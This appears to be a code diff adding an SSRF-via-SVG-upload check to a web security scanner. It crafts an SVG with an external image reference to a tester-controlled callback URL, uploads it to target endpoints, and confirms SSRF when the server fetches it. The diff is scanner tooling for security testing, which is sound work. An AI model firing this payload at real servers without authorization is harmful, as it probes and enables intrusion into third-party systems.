@@ -288,11 +288,15 @@ class UploadProbe:
 
     def __init__(self, out_dir: str, timeout: float = 10.0,
                  auth_headers: Optional[dict] = None,
-                 max_endpoints: int = 8):
+                 max_endpoints: int = 8,
+                 payload_server=None,
+                 public_url: Optional[str] = None):
         self.out_root = Path(out_dir) / "upload_probes"
         self.timeout = timeout
         self.auth_headers = auth_headers or {}
         self.max_endpoints = max_endpoints
+        self.payload_server = payload_server
+        self.public_url = (public_url or "").rstrip("/") or None
 
     async def run(self, classifier_result) -> UploadProbeResult:
         result = UploadProbeResult(out_dir=str(self.out_root))
@@ -325,7 +329,58 @@ class UploadProbe:
                     )
                     result.findings.append(finding)
                     result.tests_sent += 1
+                # SSRF-via-upload check — only runs when tunnel is wired. An
+                # SVG with an embedded external resource pointing at our
+                # tunnel URL. Server-side image processors (ImageMagick,
+                # thumbnail generators, EXIF readers) that fetch external
+                # references will call back, confirming server-side SSRF
+                # through the upload pipeline.
+                if self.payload_server and self.public_url:
+                    ssrf_finding = await self._test_upload_ssrf(
+                        client, url, field_name, ep_dir,
+                    )
+                    if ssrf_finding is not None:
+                        result.findings.append(ssrf_finding)
+                        result.tests_sent += 1
         return result
+
+    async def _test_upload_ssrf(
+        self, client, url, field_name, ep_dir,
+    ) -> Optional[UploadFinding]:
+        token = self.payload_server.mint_token("upload")
+        callback = f"{self.public_url}/r/{token}"
+        # SVG with an external <image> reference — common SSRF-via-image-render
+        svg = (
+            '<?xml version="1.0" standalone="no"?>\n'
+            '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
+            '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
+            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n'
+            f'  <image xlink:href="{callback}" height="10" width="10"/>\n'
+            '</svg>\n'
+        )
+        files = {field_name: (f"hxxpsin-{token}.svg", svg.encode(), "image/svg+xml")}
+        try:
+            await client.post(url, files=files)
+        except (httpx.HTTPError, httpx.TimeoutException):
+            return None
+        # Give server-side processors a moment to render/extract the SVG
+        await asyncio.sleep(3.0)
+        hits = self.payload_server.hits_for(token)
+        if not hits:
+            return None
+        ev = (
+            f"Upload-SSRF: server-side SVG processor fetched {callback} "
+            f"(peer={hits[0].peer}, {len(hits)} hit(s))"
+        )
+        return UploadFinding(
+            endpoint=url, test_name="ssrf-via-svg-render",
+            field_name=field_name,
+            filename_sent=f"hxxpsin-{token}.svg",
+            content_type_sent="image/svg+xml",
+            response_status=200, response_snippet="(SSRF callback confirmed)",
+            verdict="confirmed", confidence=0.9,
+            evidence=ev,
+        )
 
     def _select_targets(self, classifier_result) -> list[str]:
         from classifier import Cat
